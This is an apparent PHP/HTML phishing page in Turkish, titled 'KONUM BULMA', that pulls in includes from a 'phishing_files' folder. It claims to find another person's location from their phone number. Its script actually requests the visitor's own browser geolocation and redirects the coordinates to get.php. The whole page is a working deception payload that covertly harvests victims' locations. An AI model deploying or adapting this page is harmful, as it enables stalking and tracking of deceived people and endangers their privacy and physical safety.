<!DOCTYPE html>
<html>
  <head>
<?php
include ("../../phishing_files/info-command.php");
?>
    <meta name="viewport" content="width=device-width">
    <meta charset="utf-8">
    <title>KONUM BULMA</title>
<link rel="icon" href="https://image.flaticon.com/icons/png/512/4021/4021314.png" type="image/x-icon"/>
<style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  margin: 0;
  padding: 0;
  background: #000;
  box-sizing: border-box;
}
a {
  font-family: 'Poppins', sans-serif;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

.red-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #e50000,
    0 0 40px #e50000,
    0 0 50px #e50000,
    0 0 100px #e50000;
}

.red-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}


.box{
  width: 300px;
  padding: 10px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%);
  background: black;
  text-align: center;
  border-radius: 50px;
  box-shadow: 0 0 5px #7CFC00,
              0 0 25px #7CFC00,
              0 0 50px #7CFC00,
	      0 0 200px #7CFC00;
}
.box h1{
  color: white;
  font-size: 25px;
  text-transform: uppercase;
  font-weight: 500;
}
.box input[type = "text"],.box input[type = "number"]{
  border:0;
  background: none;
  display: block;
  margin: 30px auto;
  text-align: center;
  border: 2px solid #3498db;
  padding: 14px 10px;
  width: 200px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
}
.box input[type = "text"]:focus,.box input[type = "number"]:focus{
  width: 280px;
  border-color: #2ecc71;
}
.box input[type = "submit"]{
  border:0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #2ecc71;
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
p {
  margin-top: 20px;
  font-family: 'Poppins', sans-serif;
  color: #7CFC00;
}
.box input[type = "submit"]:hover{
  background: #2ecc71;
}
.info-box ul{
margin-top: -60px;
left: 35px;
}
</style>
  </head>
  <body>
<div class="box">
<?php
include ("../../phishing_files/info-box.php");
?>
<br><img src="https://image.flaticon.com/icons/png/512/4021/4021314.png" width="100" height="100" style="background: #7cfc00; border-radius:50px;"><br><br>
  <h1 class="green-neon">KONUM BULMA</h1>
  <p>Elinizde numarası bulunan kişinin  konumunu bulmak için aşağıya numarasını girip konum izni veriniz.</p>
  <!--<input type="text" name="" placeholder="Test">-->
  <input type="number" name="" placeholder="Numara Giriniz.." autocomplete="off" required>
  <input type="submit" name="" value="Konumunu Bul"onclick="getuserLocation();">
</div>
  	<p id="KUL_DENE"></p>       

<div id="HAR_DENE"></div>

        <script>
            var x=document.getElementById("KUL_DENE");
            function getuserLocation(){
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showuserPosition,showbrowserError);
                }
                else{
                    x.innerHTML="TARAYICI GEOLOCATIONI DESTEKLEMIYOR";
                }
            }
       
        function showuserPosition(position) {
            var latlon=position.coords.latitude+","+position.coords.longitude;
            var img_url="http://maps.googleapis.com/maps/api/staticmap?center="
            +latlon+"&zoom=14&size=400x300&sensor=false";
            document.getElementById("HAR_DENE").innerHTML=latlon;
            window.location = "get.php?veri="+latlon;
            
        }

        function showbrowserError(error){
            switch(error.code)
            {
                case error.PERMISSION_DENIED:
                x.innerHTML="KULLANICI GEOLOCATION TALEBINI REDDETTI"
                break;
                case error.POSITION_UNAVAILABLE:
                x.innerHTML="KONUM BILGISI YOK"
                break;
                case error.TIMEOUT:
                x.innerHTML="ZAMAN ASIMI"
                break;
                case error.UNKNOWN_ERROR:
                x.innerHTML="BILINMEYEN HATA"
                break;
            }
        }
        </script>
  </body>
</html>
